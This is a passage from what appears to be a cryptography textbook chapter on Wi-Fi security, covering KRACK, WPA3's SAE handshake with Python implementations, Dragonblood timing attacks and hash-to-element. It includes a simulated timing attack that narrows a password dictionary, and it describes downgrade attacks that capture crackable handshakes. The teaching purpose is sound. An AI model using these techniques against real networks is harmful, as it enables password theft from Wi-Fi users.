<rect x="10" y="80" width="140" height="24" rx="4" fill-opacity=".12" stroke="currentColor"/>
<text x="80" y="97" text-anchor="middle" font-size="12">install PTK, PN = 1</text>
<line x1="80" y1="128" x2="312" y2="128" stroke="currentColor" stroke-width="1.5"/>
<text x="200" y="121" text-anchor="middle" font-size="12">msg 4</text>
<text x="330" y="133" font-size="13" font-weight="bold">dropped</text>
<line x1="80" y1="165" x2="316" y2="165" stroke="currentColor"/>
<polygon points="320,165 308,160 308,170"/>
<text x="200" y="158" text-anchor="middle" font-size="12">data, PN 1 and 2 (recorded)</text>
<line x1="556" y1="205" x2="84" y2="205" stroke="currentColor" stroke-width="1.5"/>
<polygon points="80,205 92,200 92,210"/>
<text x="440" y="198" text-anchor="middle" font-size="12">msg 3 again (new replay counter)</text>
<text x="200" y="198" text-anchor="middle" font-size="12">forwarded</text>
<rect x="10" y="218" width="150" height="40" rx="4" fill-opacity=".25" stroke="currentColor"/>
<text x="85" y="235" text-anchor="middle" font-size="12" font-weight="bold">reinstall same PTK</text>
<text x="85" y="251" text-anchor="middle" font-size="12" font-weight="bold">PN back to 1</text>
<line x1="80" y1="285" x2="316" y2="285" stroke="currentColor"/>
<polygon points="320,285 308,280 308,290"/>
<text x="200" y="278" text-anchor="middle" font-size="12">data, PN 1 again</text>
<text x="330" y="290" font-size="12">same keystream as the first PN 1</text>
<line x1="80" y1="330" x2="556" y2="330" stroke="currentColor"/>
<polygon points="560,330 548,325 548,335"/>
<text x="320" y="323" text-anchor="middle" font-size="12">msg 4 forwarded now: AP installs PTK, nothing looks wrong</text>
<text x="320" y="370" text-anchor="middle" font-size="12.5" fill-opacity=".7">the attacker never learns the key; it only chooses when frames arrive</text>
</svg>
<figcaption>Figure 9.4. KRACK against the 4-way handshake. Holding back message 4 makes the AP resend message 3, and the device's second key installation resets the packet number that the CCMP nonce is built from.</figcaption>
</figure>

What the reused nonces give the attacker depends on the cipher. Under CCMP,
the keystream reuse lets it decrypt frames whose partner frame has a known or
guessable plaintext, and the reset receive window lets it replay old frames.
Under TKIP it could also recover the Michael key and forge frames in one
direction; under GCMP, nonce reuse leaks GCM's authentication key (Chapter
4), allowing forgery both ways. Windows and iOS did not accept a retransmitted
message 3, so the 4-way variant missed them; the group key variant did not.

The same pattern appeared in every handshake that installs a key, and the
disclosure on 16 October 2017 came with ten CVE numbers, covering the 4-way and
group key handshakes, 802.11r fast transition (where the AP is the victim),
the PeerKey and TDLS handshakes, and waking from WNM sleep mode. In "Release
the Kraken" (CCS 2018) the same authors bypassed the standard's first
countermeasure for the integrity group key and found reinstallations in newer
handshakes such as FILS; the standard was corrected again.

### Fix it: install once

The fix was in implementations: never reinstall a key in use, never reset a
packet number.

```python
# Fix it: the 2017 patch. Uses Client, keystream, xor and tk from the listing above.
class PatchedClient(Client):
    def install_key(self, tk):
        if getattr(self, "tk", None) == tk:   # already in use: answer msg 3, do not reinstall
            return
        self.tk, self.pn = tk, 1
c = PatchedClient()
c.install_key(tk)
g1 = c.send(b"GET /habitat/login HTTP/1.1  Host: hab")
c.install_key(tk)                             # the replayed message 3 changes nothing
g2 = c.send(b"user=jim&pass=red-dust-2026&action=login")
print("packet numbers after the fix:", g1[0], "then", g2[0])
```

It prints:

```text
packet numbers after the fix: 1 then 2
```

The hostapd and wpa_supplicant patches of October 2017 did this, and also
refused to install an all-zero key. Cas Cremers,
Benjamin Kiesl and Niklas Medinger later (USENIX Security 2020) modeled the
handshake *with* its state machine and key installation in Tamarin, and showed
that the patched standard is secure, closing the gap the 2005 proof had left.

!!! note "Life story: KRACK"
    **Born:** October 2017, Mathy Vanhoef and Frank Piessens (KU Leuven), CCS
    2017 · **Purpose:** force nonce reuse in WPA2 by replaying handshake
    messages · **Helped:** patches in every Wi-Fi stack, a clarified
    standard, and formal models that include key installation · **Status:**
    fixed in maintained devices; still present in unpatched ones

## 9.7 WPA3-Personal: SAE

*Level: intermediate.*

The flaw in WPA2-Personal is structural: the PMK is a function of the password
alone, and the handshake shows anyone a value to test guesses against. The fix
is a **password-authenticated key exchange** (PAKE), where the password guides
a Diffie-Hellman exchange so that a recording gives an attacker nothing to test,
and each guess requires a live exchange with the real device. WPA3-Personal
uses **SAE**, Simultaneous Authentication of Equals, which Dan Harkins
designed under the name **Dragonfly** (RFC 7664, 2015).

<div class="mars-steps" markdown>

1. **Password element.** Both sides hash the password with both MAC addresses
   into a point $\mathit{PWE}$ on the curve (P-256 by default). The original
   method, "hunting and pecking", hashes with a counter until the result is the
   $x$ coordinate of a point on the curve.
2. **Commit.** Each side picks random $\mathit{rand}$ and $\mathit{mask}$ and sends

   $$
   \mathit{scalar} = \mathit{rand} + \mathit{mask} \bmod n,\qquad
   \mathit{element} = -\mathit{mask}\cdot\mathit{PWE}.
   $$

3. **Shared secret.** Each computes
   $K = \mathit{rand}\cdot(\mathit{scalar}'\cdot\mathit{PWE} + \mathit{element}')$
   from the other's commit. Both get $\mathit{rand}\cdot\mathit{rand}'\cdot\mathit{PWE}$,
   because the masks cancel.
4. **Confirm.** From $K$ they derive a confirmation key (KCK) and the PMK, and
   exchange MACs over both commits. A wrong password gives a different
   $\mathit{PWE}$, a different $K$ and a failed confirm.
5. **The 4-way handshake** then runs as in WPA2, with this PMK.

</div>

Both sides can send their commits at once, without roles of client and server,
which is the "equals" in the name and suits mesh networks where two access
points authenticate each other.

<figure class="mars-fig">
<svg viewBox="0 0 640 300" width="640" role="img" aria-label="SAE: both sides derive the password element, send commit messages with scalar and element, compute the shared secret, exchange confirm messages, and then run the 4-way handshake with the new PMK" fill="currentColor" font-size="13.5">
<text x="110" y="22" text-anchor="middle" font-weight="bold">device</text>
<text x="530" y="22" text-anchor="middle" font-weight="bold">access point</text>
<line x1="110" y1="32" x2="110" y2="290" stroke="currentColor"/>
<line x1="530" y1="32" x2="530" y2="290" stroke="currentColor"/>
<rect x="150" y="40" width="340" height="24" rx="4" class="soft"/>
<text x="320" y="57" text-anchor="middle" font-size="12.5">both: PWE = hash(password, MAC addresses) → point</text>
<line x1="110" y1="95" x2="526" y2="95" stroke="currentColor" stroke-width="1.5"/>
<polygon points="530,95 518,90 518,100"/>
<text x="320" y="87" text-anchor="middle">commit: scalar, element</text>
<line x1="530" y1="125" x2="114" y2="125" stroke="currentColor" stroke-width="1.5"/>
<polygon points="110,125 122,120 122,130"/>
<text x="320" y="117" text-anchor="middle">commit: scalar′, element′</text>
<rect x="150" y="138" width="340" height="24" rx="4" class="soft-acc"/>
<text x="320" y="155" text-anchor="middle" class="acc-fill" font-size="12.5">K = rand·(scalar′·PWE + element′) → KCK, PMK</text>
<line x1="110" y1="190" x2="526" y2="190" stroke="currentColor" stroke-width="1.5"/>
<polygon points="530,190 518,185 518,195"/>
<text x="320" y="182" text-anchor="middle">confirm: MAC under KCK over both commits</text>
<line x1="530" y1="220" x2="114" y2="220" stroke="currentColor" stroke-width="1.5"/>
<polygon points="110,220 122,215 122,225"/>
<text x="320" y="212" text-anchor="middle">confirm′</text>
<line x1="110" y1="262" x2="526" y2="262" stroke="currentColor" stroke-width="2" stroke-dasharray="6 4"/>
<text x="320" y="254" text-anchor="middle">4-way handshake with the new PMK</text>
<text x="320" y="285" text-anchor="middle" font-size="12.5">a recording contains no value that tests a password guess</text>
</svg>
<figcaption>Figure 9.5. SAE. The commit messages can cross in flight; neither side has to go first.</figcaption>
</figure>

### SAE by hand, in a group of eleven

Dragonfly works in any group where discrete logarithms are hard, and RFC 7664
defines it for both elliptic curves and multiplicative groups modulo a prime.
The second kind is small enough to run on paper. Take the prime $p = 23$. The
nonzero squares modulo 23 are

$$
\{1, 2, 3, 4, 6, 8, 9, 12, 13, 16, 18\},
$$

eleven elements that form a group of prime order $q = 11$ under
multiplication. "Scalar times point" becomes a power, "point plus point" a
product, a point's inverse an inverse modulo 23; scalars live modulo 11.

Suppose the password hashes to $\mathit{PWE} = 4$. The device picks
$\mathit{rand}_A = 5$ and $\mathit{mask}_A = 3$; the access point picks
$\mathit{rand}_B = 7$ and $\mathit{mask}_B = 6$.

<div class="mars-steps" markdown>

1. **Device's commit.** $\mathit{scalar}_A = 5 + 3 = 8$. For the element,
   $4^3 = 64 = 2\cdot 23 + 18$, so $4^3 \equiv 18$, and the inverse of 18
   is 9, because $18 \cdot 9 = 162 = 7 \cdot 23 + 1$. The device sends
   $(8, 9)$.
2. **AP's commit.** $\mathit{scalar}_B = 7 + 6 = 13 \equiv 2 \pmod{11}$. Then
   $4^6 = (4^3)^2 \equiv 18^2 = 324 = 14 \cdot 23 + 2$, so $4^6 \equiv 2$,
   whose inverse is 12 ($2 \cdot 12 = 24 \equiv 1$). The AP sends $(2, 12)$.
3. **Device's secret.** $\mathit{PWE}^{\mathit{scalar}_B} \cdot
   \mathit{element}_B = 4^2 \cdot 12 = 192 = 8 \cdot 23 + 8 \equiv 8$, and
   that is $4^7$, the AP's $\mathit{PWE}^{\mathit{rand}_B}$, with the mask
   cancelled. Raised to $\mathit{rand}_A = 5$: $8^2 \equiv 18$,
   $8^4 \equiv 18^2 \equiv 2$, $8^5 \equiv 16$. So $K = 16$.
4. **AP's secret.** $4^8 \cdot 9$: $4^8 = 4^6 \cdot 4^2 \equiv 2 \cdot 16 =
   32 \equiv 9$, times 9 is $81 \equiv 12$, which is $4^5$. Raised to
   $\mathit{rand}_B = 7$: $12^2 = 144 \equiv 6$, $12^4 \equiv 36 \equiv 13$,
   $12^7 = 12^4 \cdot 12^2 \cdot 12 \equiv 13 \cdot 6 \cdot 12 = 936 =
   40 \cdot 23 + 16$. So $K = 16$ again, which is $4^{35} = 4^{35 \bmod 11} =
   4^2$.
5. **A wrong password.** An attacker posing as the AP who guessed a password
   with $\mathit{PWE}' = 2$ sends, with the same random numbers, $(2, 9)$,
   since $2^6 = 64 \equiv 18$ and $18^{-1} = 9$. The device computes
   $(4^2 \cdot 9)^5 = 6^5 \equiv 2$, the attacker computes
   $(2^8 \cdot 9)^7 \equiv 4^7 \equiv 8$. The two values differ, so the
   confirm messages will not match.

</div>

The device's commit $(8, 9)$ fits every candidate $\mathit{PWE}'$ equally
well, since some $\mathit{mask}$ always gives $\mathit{PWE}'^{-\mathit{mask}} =
9$. Only the confirm, which needs $K$, separates right from wrong: one test per
live attempt. In a group of 11 the attacker could try every logarithm; in
P-256 it cannot.

```python
# SAE by hand in the group of squares mod 23 (order 11): the worked example.
p, q, PWE = 23, 11, 4
def commit(pwe, rand, mask): return (rand + mask) % q, pow(pow(pwe, mask, p), -1, p)
def secret(pwe, rand, peer): return pow(pow(pwe, peer[0], p) * peer[1] % p, rand, p)
A, B = commit(PWE, 5, 3), commit(PWE, 7, 6)
print("device sends", A, " AP sends", B)
print("K at device:", secret(PWE, 5, B), " K at AP:", secret(PWE, 7, A))
W = commit(2, 7, 6)                                   # attacker guessed PWE' = 2
print("wrong guess: device gets", secret(PWE, 5, W), " attacker gets", secret(2, 7, A))
```

It prints:

```text
device sends (8, 9)  AP sends (2, 12)
K at device: 16  K at AP: 16
wrong guess: device gets 2  attacker gets 8
```

### Code it: SAE on P-256

The program implements Dragonfly on P-256 with hunting and pecking. The
encodings and the key derivation are simplified (802.11 specifies exact byte
formats and a counter-mode KDF), but every computation of the protocol is
there.

```python
# SAE (Dragonfly, RFC 7664) on P-256, the WPA3-Personal key exchange.
# Simplified encodings; the structure is the standard's.
import hashlib, hmac
p = 2**256 - 2**224 + 2**192 + 2**96 - 1
n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551
b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b
def add(P, Q):
    if P is None: return Q
    if Q is None: return P
    if P[0] == Q[0] and (P[1] + Q[1]) % p == 0: return None
    if P == Q: l = (3 * P[0] * P[0] - 3) * pow(2 * P[1], -1, p) % p
    else:      l = (Q[1] - P[1]) * pow(Q[0] - P[0], -1, p) % p
    x = (l * l - P[0] - Q[0]) % p
    return (x, (l * (P[0] - x) - P[1]) % p)
def mul(k, P):
    R = None
    for bit in bin(k)[2:]:
        R = add(R, R)
        if bit == "1": R = add(R, P)
    return R
def neg(P): return (P[0], -P[1] % p)

def password_element(password, mac_a, mac_b, rounds=40):
    """Hunting and pecking: hash until x lands on the curve; keep looping to 40."""
    found, found_at = None, None
    for counter in range(1, rounds + 1):
        seed = hmac.new(max(mac_a, mac_b) + min(mac_a, mac_b),
                        password + bytes([counter]), hashlib.sha256).digest()
        x = int.from_bytes(seed, "big") % p
        rhs = (x ** 3 - 3 * x + b) % p
        if found is None and pow(rhs, (p - 1) // 2, p) == 1:      # a square: on the curve
            y = pow(rhs, (p + 1) // 4, p)
            found, found_at = (x, y if y % 2 == seed[-1] % 2 else p - y), counter
    return found, found_at

class Party:
    def __init__(self, password, me, peer, rand_seed):
        self.pwe, _ = password_element(password, me, peer)
        r = hashlib.sha256(rand_seed).digest()
        self.rand = int.from_bytes(r, "big") % n
        self.mask = int.from_bytes(hashlib.sha256(r).digest(), "big") % n
        self.scalar = (self.rand + self.mask) % n                  # commit: scalar
        self.element = neg(mul(self.mask, self.pwe))               #         element
    def finish(self, peer_scalar, peer_element):
        K = mul(self.rand, add(mul(peer_scalar, self.pwe), peer_element))
        keyseed = hmac.new(bytes(32), K[0].to_bytes(32, "big"), hashlib.sha256).digest()
        ctx = ((self.scalar + peer_scalar) % n).to_bytes(32, "big")
        kck = hmac.new(keyseed, b"SAE KCK" + ctx, hashlib.sha256).digest()
        self.pmk = hmac.new(keyseed, b"SAE PMK" + ctx, hashlib.sha256).digest()
        return kck
def confirm(kck, mine, theirs):
    enc = lambda s, E: s.to_bytes(32, "big") + E[0].to_bytes(32, "big") + E[1].to_bytes(32, "big")
    return hmac.new(kck, enc(*mine) + enc(*theirs), hashlib.sha256).digest()

sta, ap = bytes.fromhex("020000000100"), bytes.fromhex("020000000000")
s = Party(b"password", sta, ap, b"station's secret randomness")
a = Party(b"password", ap, sta, b"AP's secret randomness")
kck_s = s.finish(a.scalar, a.element)
kck_a = a.finish(s.scalar, s.element)
print("confirms agree:", confirm(kck_s, (s.scalar, s.element), (a.scalar, a.element)) ==
      confirm(kck_a, (s.scalar, s.element), (a.scalar, a.element)))
print("same PMK:", s.pmk == a.pmk, s.pmk.hex()[:32] + "...")

# A wrong password: a new attempt completes the commit exchange, but the confirm
# fails. Each guess costs one live exchange with the AP.
a2 = Party(b"password", ap, sta, b"AP's randomness, attempt 2")
w = Party(b"letmein", sta, ap, b"attacker's randomness")
kck_w, kck_a2 = w.finish(a2.scalar, a2.element), a2.finish(w.scalar, w.element)
print("wrong password, confirms agree:",
      confirm(kck_w, (w.scalar, w.element), (a2.scalar, a2.element)) ==
      confirm(kck_a2, (w.scalar, w.element), (a2.scalar, a2.element)))
```

```text
confirms agree: True
same PMK: True 3204b55e5fe5830af7df084b0aaaa0da...
wrong password, confirms agree: False
```

What does an eavesdropper have? Both scalars and both elements. To test a
password guess, it would compute that guess's $\mathit{PWE}$, but then it would
need $\mathit{rand}$ or $\mathit{mask}$, which are hidden behind the elliptic
curve discrete logarithm problem. So a recording is useless for guessing, and
an attacker who wants to guess must run the protocol with the device or the
access point, once per guess, where it can be noticed and rate-limited. And
since $K$ comes from fresh random values, learning the password later does not
decrypt recorded sessions: SAE gives forward secrecy.

### What crosses the air, and what each side must check

SAE runs in 802.11 **Authentication** frames before association (algorithm
number 3; open system is 0), sequence 1 for a commit, 2 for a confirm. A group
19 commit carries the two-byte group number, the 32-byte scalar and the 64-byte
element: 98 bytes, plus optional fields. A confirm carries a two-byte
**send-confirm** counter and an HMAC-SHA-256 under the KCK over the counter,
both scalars and both elements.

The receiving side must check more than the confirm:

- **The scalar** must satisfy $1 < \mathit{scalar} < r$, the group order.
- **The element** must be a point on the curve. Accepting a point on another
  curve hands the peer an invalid-curve attack that leaks $\mathit{rand}$
  piece by piece ([Mathematics, §12.10](../mathematics/12-Elliptic-Curve-Group.md#1210-break-it-the-invalid-curve-attack)).
- **Reflection.** A commit equal to the device's own is an echo; reject it.
- **Clogging.** Commits are costly to process, so under load the AP answers
  with an **anti-clogging token** bound to the sender's MAC address, to be
  echoed, much like WireGuard's cookie
  ([§8.7](08-WireGuard-and-Noise.md#87-silence-cookies-and-denial-of-service)). An
  attacker in radio range can receive frames at any address it invents, so
  the token limits floods only partly.

A small state machine with retransmission timers handles lost frames, and the
send-confirm counter keeps a retransmitted confirm from looking like a replay.
Both sides derive a PMKID from the scalars, so a device that reconnects can
offer the cached PMK and skip SAE.

## 9.8 Dragonblood: SAE's side channels

*Level: intermediate.*

In April 2019 Mathy Vanhoef and Eyal Ronen published **Dragonblood**, a set of
attacks on WPA3's first implementations. The protocol was sound; its
implementation details leaked. The main problem was hunting and pecking: the
number of loop iterations needed to find $\mathit{PWE}$ depends on the password
and the MAC addresses. Implementations that stopped as soon as they found a
point, or whose memory access pattern in the loop depended on the password,
revealed that number to an attacker who could measure response times or watch
the cache from software on the same machine. Since the MAC addresses are part
of the input, the attacker can spoof many different client addresses, measure
each, and filter a dictionary offline: each measurement removes the passwords
that would have taken a different number of iterations.

### Break it: shrinking a dictionary with timing

```python
# Dragonblood (2019): if the loop stops when the point is found, the time taken
# reveals the counter. Spoofing several MAC addresses filters a dictionary offline.
victim_password = b"redplanet"
dictionary = [b"redplanet"] + [("pw%05d" % i).encode() for i in range(3000)]
spoofed_macs = [bytes([2, 0, 0, 0, 7, k]) for k in range(10)]
# The attacker measures, for each spoofed MAC, at which counter the AP found the PWE.
observed = [password_element(victim_password, m, ap, rounds=10)[1] for m in spoofed_macs]
print("counters observed through timing:", observed)
survivors = dictionary
for m, seen in zip(spoofed_macs, observed):
    survivors = [w for w in survivors if password_element(w, m, ap, rounds=10)[1] == seen]
    print("after MAC", m.hex(":"), "->", len(survivors), "candidates left")
print("left:", [w.decode() for w in survivors])
```

```text
counters observed through timing: [3, 1, 1, 2, 1, 1, 1, 3, 1, 2]
after MAC 02:00:00:00:07:00 -> 372 candidates left
after MAC 02:00:00:00:07:01 -> 176 candidates left
after MAC 02:00:00:00:07:02 -> 85 candidates left
after MAC 02:00:00:00:07:03 -> 33 candidates left
after MAC 02:00:00:00:07:04 -> 18 candidates left
after MAC 02:00:00:00:07:05 -> 10 candidates left
after MAC 02:00:00:00:07:06 -> 7 candidates left
after MAC 02:00:00:00:07:07 -> 3 candidates left
after MAC 02:00:00:00:07:08 -> 2 candidates left
after MAC 02:00:00:00:07:09 -> 1 candidates left
left: ['redplanet']
```

Ten timing observations, each from one spoofed connection attempt, cut 3,001
candidates to one. With a real dictionary of millions of words, a few dozen
measurements suffice.

### How much one measurement tells, by hand

On P-256 the KDF output is almost never above $p$, so each round succeeds
when its candidate $x$ gives a square, which happens for about half of all
values. The counter at which the loop first succeeds is therefore 1 with
probability $\tfrac12$, 2 with probability $\tfrac14$, $k$ with probability
$2^{-k}$. A wrong password survives one measurement only if its own counter
for that MAC address happens to equal the observed one. Averaged over what
the attacker might observe, the fraction of wrong passwords that survive is

$$
\sum_{k \ge 1} 2^{-k} \cdot 2^{-k} = \sum_{k \ge 1} 4^{-k} = \frac{1}{3}.
$$

Each spoofed address keeps about a third of the dictionary: 3,001 candidates
should fall to about $3{,}001 / 3^{10} \approx 0.05$ wrong ones after ten
measurements, which is what the program found. A dictionary of $10^7$ words
needs about $\log_3 10^7 \approx 15$ clean measurements, every
eight-character lowercase password ($26^8 \approx 2 \times 10^{11}$) about
24. Noisy timing means repeating each measurement, not more addresses.

### Timing, cache and downgrade

With the multiplicative groups 22 to 24 and the Brainpool curves, whose primes
are not close to a power of two, many KDF outputs exceed $p$ and are rejected,
and the rejections showed in response time over the air. With P-256 the timing
was flat, so the authors used a **cache attack**: software on the victim's
machine (another app on a phone) watched the loop's code paths with
Flush+Reload and learned whether the first round succeeded. The same flaws
appeared in EAP-pwd, the Dragonfly-based Enterprise method. In 2020 Daniel De Almeida Braga,
Pierre-Alain Fouque and Mohamed Sabt ("Dragonblood is still leaking") found
that patched implementations, including Intel's iwd and FreeRADIUS, still
leaked through the cache.

Dragonblood also showed two **downgrades**, which have nothing to do with
side channels:

- **Transition mode.** An AP in WPA3 transition mode offers WPA2-PSK and SAE
  under one name. An attacker sets up a fake AP with the same name offering
  only WPA2, and a WPA3-capable device connects with WPA2. As §9.4 noted, the
  attacker needs no password for message 2: it sends message 1 with any
  ANonce and gets back a valid message 2 to crack offline. The device would
  notice the mismatch at message 3, too late. The fix is the **transition
  disable** indication of WPA3 version 3.0 (December 2020): a device that has
  used SAE on a network that sends it refuses WPA2 there from then on.
- **Group downgrade.** An attacker forged rejections of the device's proposed
  SAE groups until it fell back to the weakest one both supported. H2E binds
  the list of rejected groups, carried in the commit, into the keyseed, so a
  forged rejection makes the confirms fail.

Finally, the expensive hunting-and-pecking loop made a cheap **denial of
service**: a modest stream of forged commits from invented MAC addresses could
keep an AP's processor saturated, and the anti-clogging token did not stop an
attacker who could receive the tokens.

The fixes came in layers. Implementations had already been told to run all 40
iterations regardless (the `rounds=40` in the program above), but some had not,
or leaked through memory access patterns. hostapd moved to a loop that is free
of secret-dependent branches and memory access. The lasting fix was a new
method with no loop at all, the subject of the next section.

## 9.9 Hash-to-element: SAE without the loop

*Level: intermediate.*

Hunting and pecking leaked because the work depended on the password and the
attacker could vary the input by choosing a MAC address. **Hash-to-element**
(H2E), added in IEEE 802.11-2020 and required by the Wi-Fi Alliance after
Dragonblood, splits the password element into two steps.

<div class="mars-steps" markdown>

1. **Once per network**, each side turns the SSID, the password and an
   optional password identifier into a fixed point $\mathit{PT}$, the
   **password token**:

   $$
   \begin{aligned}
   \mathit{seed} &= \mathrm{HKDF\text{-}Extract}(\text{SSID},\ \text{password} \,\|\, \text{identifier}),\\
   u_1 &= \mathrm{HKDF\text{-}Expand}(\mathit{seed},\ \texttt{"SAE Hash to Element u1 P1"},\ 48) \bmod p,\\
   u_2 &= \mathrm{HKDF\text{-}Expand}(\mathit{seed},\ \texttt{"SAE Hash to Element u2 P2"},\ 48) \bmod p,\\
   \mathit{PT} &= \mathrm{SSWU}(u_1) + \mathrm{SSWU}(u_2).
   \end{aligned}
   $$

   SSWU is the simplified Shallue-van de Woestijne-Ulas map of RFC 9380, which
   takes any field element to a curve point in a fixed sequence of field
   operations: no loop, no early exit, no rejection.
2. **Once per connection**, the two MAC addresses pick a public multiplier:

   $$
   \begin{aligned}
   h &= \mathrm{HMAC\text{-}SHA256}(0^{32},\ \max(\mathit{MAC}_A, \mathit{MAC}_B) \,\|\, \min(\mathit{MAC}_A, \mathit{MAC}_B)),\\
   \mathit{val} &= h \bmod (r - 1) + 1,\\
   \mathit{PWE} &= \mathit{val} \cdot \mathit{PT}.
   \end{aligned}
   $$

</div>

Step 1 holds everything that touches the password and never sees a MAC
address, so a thousand spoofed addresses give a thousand observations of the
*same* computation, which runs the same steps for every password. Step 2
depends on the password only through the fixed point $\mathit{PT}$ and is one scalar multiplication, which constant-time code does
for every Diffie-Hellman. The SSID now enters the derivation, which matters
in §9.12. The 48 bytes per field element, 16 more than $p$ needs, keep the bias
of reducing modulo $p$ below $2^{-128}$. Why the map always lands on the curve,
and why two mapped points are added, is algebra the mathematics book works
through in [§12.11](../mathematics/12-Elliptic-Curve-Group.md#1211-hashing-to-a-curve)
and its subsection on [the simplified SWU map](../mathematics/12-Elliptic-Curve-Group.md#the-simplified-swu-map);
here we only use it.

It also saves work: an AP computes $\mathit{PT}$ once at start-up, and each new
device costs one multiplication instead of 40 rounds of hashing and square
roots, which blunts the denial of service of §9.8.

<figure class="mars-fig">
<svg viewBox="0 0 640 360" width="640" role="img" aria-label="Two ways to make SAE's password element. Left, hunting and pecking: the password and both MAC addresses go into a loop that hashes with a counter and tests whether the result is on the curve; the counter at which it succeeds depends on the password and the addresses, which the attacker controls, so the loop's timing leaks. Right, hash-to-element: the SSID and password go once through HKDF and two SSWU maps to a fixed point PT, with no loop; then the MAC addresses give a public multiplier val, and PWE is val times PT." fill="currentColor" font-size="13">
<text x="160" y="22" text-anchor="middle" font-weight="bold">hunting and pecking (2015 to 2020)</text>
<text x="480" y="22" text-anchor="middle" font-weight="bold">hash-to-element (802.11-2020)</text>
<line x1="320" y1="10" x2="320" y2="350" stroke="currentColor" stroke-opacity=".4"/>
<rect x="40" y="40" width="240" height="34" rx="5" fill="none" stroke="currentColor"/>
<text x="160" y="62" text-anchor="middle">password + both MAC addresses</text>
<line x1="160" y1="74" x2="160" y2="96" stroke="currentColor"/>
<rect x="40" y="96" width="240" height="96" rx="5" fill-opacity=".14" stroke="currentColor"/>
<text x="160" y="118" text-anchor="middle">counter = 1, 2, 3, ...</text>
<text x="160" y="140" text-anchor="middle">x = KDF(HMAC(MACs, pw || counter))</text>
<text x="160" y="162" text-anchor="middle">x³ − 3x + b a square?</text>
<text x="160" y="182" text-anchor="middle" font-size="12">no: next counter · yes: keep x</text>
<path d="M280 150 C 305 150, 305 110, 282 110" fill="none" stroke="currentColor"/>
<polygon points="281,110 291,105 291,115"/>
<line x1="160" y1="192" x2="160" y2="216" stroke="currentColor"/>
<rect x="40" y="216" width="240" height="34" rx="5" fill="none" stroke="currentColor"/>
<text x="160" y="238" text-anchor="middle">PWE = (x, y)</text>
<text x="160" y="280" text-anchor="middle" font-size="12.5" font-weight="bold">success round depends on password</text>
<text x="160" y="298" text-anchor="middle" font-size="12.5" font-weight="bold">and on MACs the attacker chooses</text>
<text x="160" y="322" text-anchor="middle" font-size="12" fill-opacity=".7">time or cache trace leaks it (§9.8)</text>
<rect x="360" y="40" width="240" height="34" rx="5" fill="none" stroke="currentColor"/>
<text x="480" y="62" text-anchor="middle">SSID + password (+ identifier)</text>
<line x1="480" y1="74" x2="480" y2="96" stroke="currentColor"/>
<rect x="360" y="96" width="240" height="60" rx="5" fill-opacity=".14" stroke="currentColor"/>
<text x="480" y="118" text-anchor="middle">HKDF → u1, u2</text>
<text x="480" y="142" text-anchor="middle">PT = SSWU(u1) + SSWU(u2)</text>
<text x="480" y="174" text-anchor="middle" font-size="12">once per network, same steps for every input</text>
<line x1="480" y1="182" x2="480" y2="216" stroke="currentColor"/>
<rect x="360" y="216" width="240" height="34" rx="5" fill="none" stroke="currentColor"/>
<text x="480" y="238" text-anchor="middle">PWE = val · PT</text>
<text x="600" y="206" text-anchor="end" font-size="12">val = H(MACs), public</text>
<text x="480" y="280" text-anchor="middle" font-size="12.5" font-weight="bold">MACs never meet the password;</text>
<text x="480" y="298" text-anchor="middle" font-size="12.5" font-weight="bold">no loop, nothing to time</text>
<text x="480" y="322" text-anchor="middle" font-size="12" fill-opacity=".7">required on 6 GHz and for WPA3 certification</text>
</svg>
<figcaption>Figure 9.6. Two ways to the password element. Hunting and pecking mixes the password with attacker-chosen addresses inside a loop of variable length; hash-to-element makes a fixed point from the password once, with no loop, and lets the addresses touch only a public multiplier.</figcaption>
</figure>

### Code it: SAE byte for byte, against the standard

The SAE of §9.7 simplified the encodings. This program follows IEEE
802.11-2020 exactly for group 19: hunting and pecking with the standard's KDF,
the 98-byte commit, the keyseed, the KDF that yields KCK and PMK, and the
PMKID. Annex J.10 fixes the MAC addresses, the password `mekmitasdigoat`, the
local $\mathit{rand}$ and $\mathit{mask}$ and the peer's commit; hostapd
checks itself against the same numbers.

```python
# SAE as IEEE 802.11-2020 specifies it (group 19, P-256, hunting and pecking),
# checked against the standard's own test vector (Annex J.10).
# Uses add(), mul(), p and b from the P-256 listing in §9.7.
import hashlib, hmac
r = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551
def i2b(x): return x.to_bytes(32, "big")
def H(key, msg): return hmac.new(key, msg, hashlib.sha256).digest()
def kdf(key, label, context, bits):        # KDF-Hash-Length of 802.11, with SHA-256
    out, i = b"", 1
    while len(out) * 8 < bits:
        out += H(key, i.to_bytes(2, "little") + label + context + bits.to_bytes(2, "little"))
        i += 1
    return out[:bits // 8]

def pwe_hunt_and_peck(password, mac1, mac2, k=40):
    macs = max(mac1, mac2) + min(mac1, mac2)
    x = save = None
    for counter in range(1, k + 1):                 # always all k rounds
        seed = H(macs, password + bytes([counter]))
        val = int.from_bytes(kdf(seed, b"SAE Hunting and Pecking", i2b(p), 256), "big")
        if val < p and pow((val**3 - 3 * val + b) % p, (p - 1) // 2, p) == 1 and x is None:
            x, save = val, seed
    y = pow((x**3 - 3 * x + b) % p, (p + 1) // 4, p)
    return (x, y) if y % 2 == save[-1] % 2 else (x, p - y)

def commit(pwe, rand, mask):
    E = mul(mask, pwe)
    return (rand + mask) % r, (E[0], -E[1] % p)     # scalar, element = -(mask * PWE)

def keys(pwe, rand, my_scalar, peer_scalar, peer_element):
    K = mul(rand, add(mul(peer_scalar, pwe), peer_element))
    keyseed = H(bytes(32), i2b(K[0]))
    ctx = i2b((my_scalar + peer_scalar) % r)
    kck_pmk = kdf(keyseed, b"SAE KCK and PMK", ctx, 512)
    return kck_pmk[:32], kck_pmk[32:], ctx[:16]     # KCK, PMK, PMKID

# IEEE 802.11-2020 Annex J.10
a1, a2 = bytes.fromhex("4d3f2fffe387"), bytes.fromhex("a5d8aa958e3c")
rand = int("992465fd3daa3c60aa6565b7f62a2a7f2e12dd12f198faf4fbed89d7ff1ace94", 16)
mask = int("9507a90f777a044d6a0830b91ea3d5dd70bece44e1acffb86983b5e1bf9fb322", 16)
peer = bytes.fromhex("1300591b96f3397fb945100848e7b550543b6720d88337ee93fc49fd6df7e08b52"
                     "23e71b9bb048d3873f20556953a96c91536fd8ee6ca9b4a68a148b056a909be03e"
                     "83ae208f60f8ef5537858074db06687032399862999b511e0a1552a5fea317c2")
peer_scalar = int.from_bytes(peer[2:34], "big")
